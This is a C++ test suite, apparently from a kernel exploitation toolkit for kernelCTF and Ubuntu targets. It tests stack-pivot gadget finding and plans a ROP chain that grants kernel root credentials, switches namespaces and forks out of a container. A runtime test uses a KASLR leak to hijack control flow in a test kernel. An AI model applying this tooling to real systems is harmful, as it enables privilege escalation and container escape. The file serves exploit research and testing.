#pragma once

#include <cstdio>
#include "pivot/PivotFinder.cpp"
#include "target/KpwnParser.cpp"
#include "target/Target.cpp"
#include "test/TestSuite.cpp"
#include "test/TestUtils.cpp"
#include "util/HexDump.cpp"
#include "util/Payload.cpp"
#include "util/RopChain.cpp"
#include "util/stdutils.cpp"

class PivotTests: public TestSuite {
    KpwnParser parser;
    Target lts6181;

public:
    PivotTests(): TestSuite("PivotStaticTests", "stack pivot static tests"), parser({}) { }

    void init() {
        parser = KpwnParser::FromFile("test/artifacts/kernelctf.kpwn");
        lts6181 = parser.GetTarget("kernelctf", "lts-6.1.81");
    }

    TEST_METHOD(findsPivotsForLts6181, "find all pivots for LTS 6.1.81") {
        Payload p(128);
        for (int r = (int)Register::RAX; r <= (int)Register::R15; r++) {
            PivotFinder finder(lts6181.pivots, (Register) r, p);
            auto pivots = finder.FindAll();
            Log("Found %lu pivots for %s", pivots.size(), register_names[r]);
            for (auto& pivot : pivots)
                Log(" - %s", pivot.GetDescription().c_str());
            Log("");
        }
    }

    void findPivotsForRegisters(const std::vector<std::string> distros, const std::vector<Register>& registers) {
        auto targets = parser.GetAllTargets();
        if (targets.empty())
            Error("The database does not contain any targets.");

        for (auto target : targets) {
            if (!contains(distros, target.distro))
                continue;

            for (auto buf_reg : registers) {
                Payload p(128);
                PivotFinder finder(target.pivots, buf_reg, p);
                if (!finder.Find().has_value())
                    Error("could not find stack pivot via %s register for target %s/%s", register_names[(int)buf_reg], target.distro.c_str(), target.release_name.c_str());
            }
        }
    }

    TEST_METHOD(findKernelCtfRsiPivots, "finds the right RSI pivots for kernelCTF releases") {
        findPivotsForRegisters({ "kernelctf" }, { Register::RSI });
    }

    TEST_METHOD(findKernelCtfRdiPivots, "finds the right RDI pivots for kernelCTF releases [TODO]") {
        findPivotsForRegisters({ "kernelctf" }, { Register::RDI });
    }

    TEST_METHOD(findUbuntuRdiRsiPivots, "finds the right RSI and RDI pivots for Ubuntu releases [TODO]") {
        findPivotsForRegisters({ "ubuntu" }, { Register::RDI, Register::RSI });
    }

    TEST_METHOD(rsiLayoutPlanning, "plan RSI-based stack pivot and rop chain layout") {
        auto kaslr_base = 0xffffffff81000000;
        auto target = lts6181;

        RopChain rop(kaslr_base);
        target.AddRopAction(rop, RopActionId::COMMIT_KERNEL_CREDS);
        target.AddRopAction(rop, RopActionId::SWITCH_TASK_NAMESPACES, { 1 });
        target.AddRopAction(rop, RopActionId::TELEFORK, { 5000 });

        Payload payload(256);
        // Make the layout a bit more complex, so we block the planner to pivot to buf+0x00, but
        //   it needs to pivot to e.g. buf+0x08. This will also make "jmp [RSI + 0xf]" filtered
        //   out and e.g. "jmp [RSI + 0x2e]" needs to be used which will trigger more complex
        //   "jump over" shift sequences as the ROP payload won't fit between 0x08 and 0x2e.
        payload.Reserve(0, 4);

        PivotFinder finder(target.pivots, Register::RSI, payload);
        auto rop_pivot = finder.PivotToRop(rop);

        Log("Selected stack pivot: %s", rop_pivot.pivot.GetDescription().c_str());
        // FIXME: Add this back once stack pivoting ensures smallest dest offset
        // feature/layout fixes this
        //ASSERT_EQ(0x08, rop_pivot.pivot.GetDestinationOffset());

        Log("ROP chain min offset: 0x%lx", rop_pivot.rop_min_offset);

        for (auto& shift : rop_pivot.stack_shift.stack_shifts)
            Log("Stack jump @0x%lx: 0x%lx -> 0x%lx (size: 0x%lx)", shift.pivot.address,
                shift.from_offset, shift.from_offset + shift.pivot.shift_amount, shift.pivot.shift_amount);

        Log("Final ROP chain offset: 0x%lx", rop_pivot.rop_offset);
        Log("Final payload:\n%s", HexDump::Dump(payload.GetUsedData()).c_str());
    }
};

class PivotKpwnTests: public TestSuite {
public:
    PivotKpwnTests(): TestSuite("PivotRuntimeTests", "stack pivot runtime tests") { }

    TEST_METHOD(pivotWinTargetTest, "call win_target via stack pivot") {
        Payload p(128);
        Register buf_reg = Register::RSI;

        PivotFinder finder(env->GetTarget().pivots, buf_reg, p);
        auto pivot = finder.Find(8);
        Log("selected pivot: %s", pivot->GetDescription().c_str());

        auto& kpwn = env->GetKpwn();
        auto kaslr = kpwn.KaslrLeak();
        pivot->ApplyToPayload(p, kaslr);

        auto offs = pivot->GetDestinationOffset();
        p.Set(offs, kpwn.WinTarget());
        p.Set(offs + 8, kpwn.GetRipControlRecoveryAddr());

        auto buf_addr = kpwn.AllocBuffer(p.GetData(), true);
        kpwn.CallAddr(kaslr + pivot->GetGadgetOffset(), { { buf_reg, buf_addr } });
        kpwn.CheckWin();
        kpwn.Kfree(buf_addr);
    }
};